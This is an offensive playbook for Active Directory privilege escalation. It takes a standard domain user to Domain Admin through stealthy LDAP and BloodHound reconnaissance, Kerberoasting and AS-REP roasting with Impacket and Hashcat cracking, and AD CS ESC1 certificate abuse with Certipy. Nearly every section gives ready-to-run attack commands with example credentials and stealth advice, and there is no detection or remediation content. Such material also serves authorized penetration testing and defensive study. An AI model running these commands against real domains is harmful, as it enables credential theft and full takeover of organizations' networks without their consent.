# Active Directory Privilege Escalation Playbook

This playbook covers technical methodologies for escalating privileges within an Active Directory Domain from a standard domain user foothold up to Tier 0 (Domain Admin / Enterprise Admin).

```
[ Domain User Foothold ]
           │
           ├─► AS-REP Roasting (No Pre-Auth Accounts) ───────► Offline Hash Cracking
           ├─► Kerberoasting (Service Accounts with SPN) ────► TGS RC4/AES Hash Recovery
           └─► AD CS Certificate Misconfiguration (ESC1) ────► Full Domain Admin Impersonation
```

---

## 1. Internal Domain Reconnaissance (T1087 / T1069)

### Stealthy LDAP Querying
Avoid running noisy full-domain dumps. Use targeted, paged LDAP queries:
```bash
# Query all accounts with ServicePrincipalNames configured
ldapsearch -x -H ldap://dc01.corp.local -b "dc=corp,dc=local" "(&(servicePrincipalName=*)(!(cn=*$)))" sAMAccountName servicePrincipalName
```

### BloodHound Graph Analysis (T1087.002)
- Execute SharpHound or BloodHound.py with operational security flags:
  ```bash
  bloodhound-python -d corp.local -u 'standard_user' -p 'Password123' -gc dc01.corp.local -c DCOnly,Default
  ```
- **High-Priority Attack Paths**:
  - `Find Shortest Paths to Domain Admins`
  - `Find Principals with GenericAll or WriteDacl on Groups`
  - `Find Unconstrained Delegation Systems`

---

## 2. Kerberoasting (T1558.003)

### Technical Primitive
Any authenticated domain user can request a Kerberos Ticket Granting Service (TGS) ticket from the Key Distribution Center (KDC) for any account with an SPN registered. The ticket payload is encrypted with the NTLM hash of the service account.

### Execution:
1. Identify high-privilege service accounts using `tools/ad_audit.py analyze`.
2. Request TGS tickets using standard Kerberos API:
   ```bash
   # Using Impacket GetUserSPNs
   GetUserSPNs.py corp.local/standard_user:Password123 -dc-ip 10.10.10.1 -request -outputfile kerberoast_hashes.txt
   ```
3. Crack the retrieved tickets offline using Hashcat:
   ```bash
   # Hashcat mode 13100 (Kerberos 5 TGS-REP etype 23 - RC4)
   hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule
   ```

---

## 3. AS-REP Roasting (T1558.004)

### Technical Primitive
When the `DONT_REQ_PREAUTH` flag (`0x400000`) is set on a user account, the KDC issues an AS-REP encrypted response without requiring prior validation of the user's password.

### Execution:
1. Enumerate vulnerable accounts via `tools/ad_audit.py`:
   ```bash
   python3 tools/ad_audit.py analyze --demo
   ```
2. Retrieve the offline crackable AS-REP hashes:
   ```bash
   GetNPUsers.py corp.local/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt
   ```
3. Crack offline via Hashcat:
   ```bash
   hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
   ```

---

## 4. Active Directory Certificate Services (AD CS) Abuse (ESC1)

Misconfigured certificate templates allow unprivileged users to enroll and request certificates on behalf of any arbitrary identity (e.g. Domain Administrator).

### Vulnerable Template Conditions:
1. `Client Authentication` EKU enabled.
2. `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` enabled (enrollee can supply Subject Alternative Name - SAN).
3. Enrollment permissions granted to `Domain Users` or `Authenticated Users`.
4. Manager approval disabled.

### Exploitation via Certipy:
```bash
# 1. Enumerate vulnerable templates
certipy find -u standard_user@corp.local -p 'Password123' -dc-ip 10.10.10.1 -vulnerable

# 2. Request certificate impersonating Domain Administrator
certipy req -u standard_user@corp.local -p 'Password123' -ca CORP-CA -template VulnerableTemplate -upn administrator@corp.local -out admin.pfx

# 3. Authenticate using the forged certificate to recover Admin NTLM hash
certipy auth -pfx admin.pfx -dc-ip 10.10.10.1
```
- Returns the full NTLM hash of the `Administrator` account without touching LSASS memory on the Domain Controller.
